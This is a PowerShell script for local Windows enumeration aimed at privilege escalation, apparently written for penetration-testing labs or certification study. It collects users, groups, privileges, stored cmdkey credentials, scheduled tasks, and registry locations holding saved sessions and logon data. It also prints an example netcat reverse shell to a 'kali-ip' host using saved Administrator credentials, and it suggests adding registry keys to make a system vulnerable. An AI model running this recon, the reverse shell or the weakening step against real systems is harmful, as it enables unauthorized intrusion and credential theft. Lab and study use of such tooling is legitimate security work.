# ===============================
# Local Enumeration Script (PowerShell Edition)
# Author: Muharram Ali (original batch)
# Converted for PowerShell
# ===============================

# Enable ANSI colors in modern PowerShell
$ESC = [char]27

$RED     = "$ESC[91m"
$GREEN   = "$ESC[92m"
$YELLOW  = "$ESC[93m"
$BLUE    = "$ESC[94m"
$MAGENTA = "$ESC[95m"
$CYAN    = "$ESC[96m"
$WHITE   = "$ESC[97m"
$RESET   = "$ESC[0m"
$BOLD    = "$ESC[1m"

# Hide cursor
Write-Host -NoNewline "$ESC[?25l"

Write-Host "${BOLD}${GREEN} === Local Enumeration Script ==="
Write-Host "      Author: Muharram Ali"
Write-Host "      Email: ali.oscp@proton.me"
Write-Host "      Version: 2025.1"
Write-Host ""

Write-Host "[*] Starting System Enumeration"
Write-Host ""

# ===============================
# Basic System Identification
# ===============================
Write-Host "${BOLD}${BLUE}**** Basic System Identification ****${RESET}"
Write-Host "${YELLOW}[Command]${RESET} ${GREEN}Get-CimInstance Win32_OperatingSystem | Select-Object @{N="OS Name";E={$_.Caption}},@{N="OS Version";E={$_.Version}},@{N="System Type";E={$_.OSArchitecture}} | Format-List{RESET}"
Get-CimInstance Win32_OperatingSystem | Select-Object @{N="OS Name";E={$_.Caption}},@{N="OS Version";E={$_.Version}},@{N="System Type";E={$_.OSArchitecture}} | Format-List
Write-Host ""

Write-Host "${YELLOW}[Command]${RESET} ${GREEN}hostname${RESET}"
hostname
Write-Host ""

# ===============================
# Current User Information
# ===============================
Write-Host "${BOLD}${BLUE}**** Current User Information ****${RESET}"
Write-Host "${YELLOW}[Command]${RESET} ${GREEN}whoami /user${RESET}"
whoami /user
whoami /priv
Write-Host ""

Write-Host "${YELLOW}[Command]${RESET} ${GREEN}net user $env:USERNAME${RESET}"
Write-Host "${YELLOW}Current user Properties. Check logon scripts etc${RESET}"
net user $env:USERNAME
Write-Host ""

Write-Host "${YELLOW}[Command]${RESET} ${GREEN}whoami /groups${RESET}"
Write-Host "${YELLOW}Current user belongs to the below local groups${RESET}"
whoami /groups
Write-Host ""

Write-Host "${YELLOW}[Command]${RESET} ${GREEN}whoami /groups | findstr share${RESET}"
whoami /groups | findstr /i "share"
Write-Host ""

Write-Host "${YELLOW}[Command]${RESET} ${GREEN}query user${RESET}"
query user
Write-Host ""

# ===============================
# User and Group Information
# ===============================
Write-Host "${BOLD}${BLUE}**** User and Group Information ****${RESET}"

Write-Host "${YELLOW}[Command]${RESET} ${GREEN}net user${RESET}"
net user
Write-Host ""

Write-Host "${YELLOW}[Command]${RESET} ${GREEN}net localgroup${RESET}"
net localgroup
Write-Host ""

Write-Host "${YELLOW}[Command]${RESET} ${GREEN}net localgroup administrators${RESET}"
net localgroup administrators
Write-Host ""

Write-Host "${YELLOW}[Command]${RESET} ${GREEN}cmdkey /list${RESET}"
cmdkey /list
Write-Host ""

Write-Host "${BOLD}${BLUE}**** If cmdkey is listed, you can run commands based on the user permission. ****${RESET}"
Write-Host "${BOLD}${BLUE}Example: runas /savecred /user:Administrator `"nc.exe -nv kali-ip 4445 -e cmd.exe`"${RESET}"
Write-Host ""

Write-Host "${YELLOW}[Command]${RESET} ${GREEN}net user /domain${RESET}"
net user /domain 2>$null | findstr /v "The request will be processed at a domain controller"
Write-Host ""

Write-Host "${YELLOW}[Command]${RESET} ${GREEN}net group /domain${RESET}"
net group /domain 2>$null | findstr /v "The request will be processed at a domain controller"
Write-Host ""

# ===============================
# Privilege Checks
# ===============================
Write-Host "${BOLD}${BLUE}**** Privilege Checks ****${RESET}"

"SeImpersonatePrivilege","SeDebugPrivilege","SeTakeOwnershipPrivilege",
"SeManageVolumePrivilege","SeRestorePrivilege" | ForEach-Object {
    Write-Host "${YELLOW}[Command]${RESET} ${GREEN}Checking $_${RESET}"
    whoami /priv | findstr $_
    Write-Host ""
}

Write-Host "${YELLOW}[Command]${RESET} ${GREEN}Checking for local service account${RESET}"
whoami | findstr "local service"
Write-Host ""

Write-Host "${YELLOW}[Command]${RESET} ${GREEN}Checking for service accounts${RESET}"
whoami | findstr "svc"
Write-Host ""

$groupsToCheck = @(
    "Backup Operators",
    "DnsAdmins",
    "Print Operators",
    "Server Operators",
    "GPO Admins"
)

foreach ($g in $groupsToCheck) {
    Write-Host "${YELLOW}[Command]${RESET} ${GREEN}Checking $g membership${RESET}"
    whoami /groups | findstr "$g"
    Write-Host ""
}

# ===============================
# Processes as SYSTEM
# ===============================
Write-Host "${BOLD}${BLUE}**** Running Processes as NT AUTHORITY SYSTEM ****${RESET}"
Write-Host "${YELLOW}[Command]${RESET} ${GREEN}tasklist /v /fi `"username eq system`"${RESET}"
tasklist /v /fi "username eq system"
Write-Host ""

# ===============================
# Local Network Shares
# ===============================
Write-Host "${BOLD}${BLUE}**** Local Network Shares ****${RESET}"
Write-Host "${YELLOW}[Command]${RESET} ${GREEN}net view \\127.0.0.1${RESET}"
net view \\127.0.0.1 2>$null
Write-Host ""

# ===============================
# Network Connections
# ===============================
Write-Host "${BOLD}${BLUE}**** Network Connections ****${RESET}"

Write-Host "${YELLOW}[Command]${RESET} ${GREEN}netstat -ano | findstr LISTENING${RESET}"
netstat -ano | findstr "LISTENING"
Write-Host ""

Write-Host "${YELLOW}[Command]${RESET} ${GREEN}netstat -ano | findstr ESTABLISHED${RESET}"
netstat -ano | findstr "ESTABLISHED"
Write-Host ""

# ===============================
# Installed Software
# ===============================
Write-Host "${BOLD}${BLUE}**** Installed Software (Non-Microsoft) ****${RESET}"
Write-Host "${YELLOW}[Command]${RESET} ${GREEN}wmic product get name,version,vendor${RESET}"
wmic product get name,version,vendor | findstr /v /i "Microsoft Corporation"
Write-Host ""

Write-Host "${YELLOW}[Command]${RESET} ${GREEN}Registry SOFTWARE hive listing${RESET}"
Get-ChildItem -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE" | Format-Table Name
Write-Host ""

# ===============================
# Program Files Enumeration
# ===============================
Write-Host "${BOLD}${BLUE}**** Program Files Enumeration (x86) ****${RESET}"

Write-Host "${YELLOW}[Command]${RESET} ${GREEN}dir `"C:\Program Files (x86)`"${RESET}"
Get-ChildItem "C:\Program Files (x86)" -ErrorAction SilentlyContinue |
Where-Object { $_.Name -notmatch "Microsoft|Windows" } |
Format-Table Name
Write-Host ""

Write-Host "${YELLOW}[Command]${RESET} ${GREEN}dir `"C:\Program Files`"${RESET}"
Get-ChildItem "C:\Program Files" -ErrorAction SilentlyContinue |
Where-Object { $_.Name -notmatch "Microsoft|Windows" } |
Format-Table Name
Write-Host ""

# ===============================
# Scheduled Tasks
# ===============================
Write-Host "${BOLD}${BLUE}**** Scheduled Tasks (Non-Microsoft) ****${RESET}"

Write-Host "${YELLOW}[Command]${RESET} ${GREEN}schtasks /query /fo LIST${RESET}"
schtasks /query /fo LIST 2>$null | findstr /i /v "Microsoft"
Write-Host ""

Write-Host "${YELLOW}[Command]${RESET} ${GREEN}schtasks /query /fo CSV | ConvertFrom-Csv | Where-Object {$_.TaskPath -notlike "*Microsoft*"} | Select-Object TaskName,TaskPath,Status | Format-Table${RESET}"
schtasks /query /fo CSV | ConvertFrom-Csv | Where-Object {$_.TaskPath -notlike "*Microsoft*"} | Select-Object TaskName,TaskPath,Status | Format-Table
Write-Host ""

# ===============================
# Startup Programs
# ===============================
Write-Host "${BOLD}${BLUE}**** Startup Programs ****${RESET}"
Get-CimInstance Win32_StartupCommand |
Select-Object Name, Command, Location, User |
Format-List
Write-Host ""

# ===============================
# Registry Enumeration
# ===============================
Write-Host "${BOLD}${BLUE}**** Registry Enumeration ****${RESET}"

$regPaths = @(
 "HKCU:\Software\SimonTatham\PuTTY\Sessions",
 "HKLM:\SOFTWARE\RealVNC\WinVNC4",
 "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest",
 "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
 "HKCU:\Software\Policies\Microsoft\Windows\Installer",
 "HKLM:\Software\Policies\Microsoft\Windows\Installer"
)

foreach ($path in $regPaths) {
    Write-Host "${YELLOW}[Command]${RESET} ${GREEN}reg query $path${RESET}"
    if (Test-Path $path) {
        Get-Item -Path $path
    } else {
        Write-Host "Not found"
    }
    Write-Host ""
}

# AlwaysInstallElevated checks
Write-Host "${YELLOW}[Command]${RESET} ${GREEN}AlwaysInstallElevated checks${RESET}"
Get-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
Write-Host ""

# ===============================
# Recycle Bin Enumeration
# ===============================
Write-Host "${BOLD}${RED}+++++++++++ Search Recyclebins +++++++++++${RESET}"
Write-Host "${YELLOW}[Command]${RESET} ${GREEN}wmic useraccount get name,sid${RESET}"
wmic useraccount get name,sid
Write-Host ""

Write-Host "${BOLD}${RED}+++++++++++ Go Beyond +++++++++++${RESET}"
Write-Host "${BOLD}[!!]${RESET}${RED} Nothing Found!${RESET}"
Write-Host "${GREEN}[+]${RESET} Try to add reg key manually to make the system vulnerable to priv escalation. Check GitBook 12.2"
Write-Host ""

Write-Host "${BOLD}${GREEN}[*] Enumeration Complete${RESET}"

# Show cursor again
Write-Host -NoNewline "$ESC[?25h"

